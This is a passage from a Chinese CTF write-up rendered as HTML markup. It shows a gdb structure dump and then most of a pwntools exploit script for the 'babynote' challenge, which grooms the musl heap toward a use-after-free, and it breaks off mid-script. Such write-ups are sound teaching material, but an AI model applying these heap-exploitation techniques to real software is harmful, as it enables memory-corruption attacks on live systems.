class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pipe_pid = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lockcount = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mode = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lock = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lbf = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cookie = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  off = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  getln_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mustbezero_2 = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  shend = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  shlim = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  shcnt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_locked = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  next_locked = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  locale = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后 exit 结束程序&lt;/p&gt;
&lt;h2 id=&#34;完整exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#完整exp&#34;&gt;#&lt;/a&gt; 完整 exp&lt;/h2&gt;
&lt;p&gt;部分注释可能错误&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level =&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./libc.so&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process([&lt;span class=&#34;string&#34;&gt;&amp;quot;./libc.so&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;./babynote&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./babynote&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get8&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ret = r.recv(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)+ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;0x&amp;#x27;&lt;/span&gt;+ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(ret,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get4&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ret = r.recv(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)+ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;0x&amp;#x27;&lt;/span&gt;+ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(ret,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;option:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;name,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;name size:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(name)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(text)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;find&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;name&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;name size:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(name)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;name&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;name size:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(name)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;clean&lt;/span&gt;():			&lt;span class=&#34;comment&#34;&gt;#only set list=0 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r,&lt;span class=&#34;string&#34;&gt;&amp;#x27;b malloc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#slot full size is 0x2c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#slot full size is 0x6c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;#free the first note,the meta(0xc)is freed,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clean()					&lt;span class=&#34;comment&#34;&gt;#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#we alloc the last slot in meta(0x2c) for abynote,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;						&lt;span class=&#34;comment&#34;&gt;#.Reuse the 0 solt in meta(0xc) (malloc from bins),&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;						&lt;span class=&#34;comment&#34;&gt;#then reuse the free slot in meta(0x2c)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;e&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;e&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#fill up meta2(0x2c)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;f&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;f&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, 